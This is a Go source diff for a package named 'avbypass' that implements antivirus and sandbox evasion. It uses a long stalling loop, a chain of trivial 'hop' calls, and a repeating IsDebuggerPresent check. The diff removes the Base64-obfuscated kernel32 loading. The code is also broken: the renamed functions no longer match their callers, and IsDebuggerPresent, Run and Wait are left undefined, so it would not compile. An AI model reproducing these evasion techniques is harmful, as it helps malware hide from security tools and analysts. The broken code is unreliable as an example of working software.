@@ -1,75 +1,72 @@
-package main
+package avbypass
 
+var magicNumber int64
 
-import "syscall"
-var K32 = syscall.MustLoadDLL(string(Base64Decode("a2VybmVsMzIuZGxs")))
-var IsDebuggerPresent = K32.MustFindProc(string(Base64Decode("SXNEZWJ1Z2dlclByZXNlbnQ=")))
-var MagicNumber int64 = 0;  
-
+// TODO wait til user clicks
 
 func BypassAV() {
-  LongLoop()
-  Jump()
-  //Wait()
-  CheckDebugger()
+	LongLoop()
+	Jump()
+	//Wait()
+	checkDebugger()
 }
 
-
-func Jump() {
-  MagicNumber++
-  hop1()
+func jump() {
+	magicNumber++
+	hop1()
 }
 
-func LongLoop()  {
-  for i := 0; i < 1000000; i++ {}
+func longLoop() {
+	for i := 0; i < 1000000; i++ {
+	}
 }
 
-func CheckDebugger() {
-  Flag,_,_ := IsDebuggerPresent.Call()
-  if Flag != 0 {
-    Run("msg * Error")
-    Wait()
-    CheckDebugger()
-    
-  }
+func checkDebugger() {
+	Flag, _, _ := IsDebuggerPresent.Call()
+	if Flag != 0 {
+		Run("msg * Error")
+		Wait()
+		checkDebugger()
+
+	}
 }
 
 func hop1() {
-  MagicNumber++
-  hop2()
+	magicNumber++
+	hop2()
 }
 func hop2() {
-  MagicNumber++
-  hop3()
+	magicNumber++
+	hop3()
 }
 func hop3() {
-  MagicNumber++
-  hop4()
+	magicNumber++
+	hop4()
 }
 func hop4() {
-  MagicNumber++
-  hop5()
+	magicNumber++
+	hop5()
 }
 func hop5() {
-  MagicNumber++
-  hop6()
+	magicNumber++
+	hop6()
 }
 func hop6() {
-  MagicNumber++
-  hop7()
+	magicNumber++
+	hop7()
 }
 func hop7() {
-  MagicNumber++
-  hop8()
+	magicNumber++
+	hop8()
 }
 func hop8() {
-  MagicNumber++
-  hop9()
+	magicNumber++
+	hop9()
 }
 func hop9() {
-  MagicNumber++
-  hop10()
+	magicNumber++
+	hop10()
 }
 func hop10() {
-  MagicNumber++
+	magicNumber++
 }
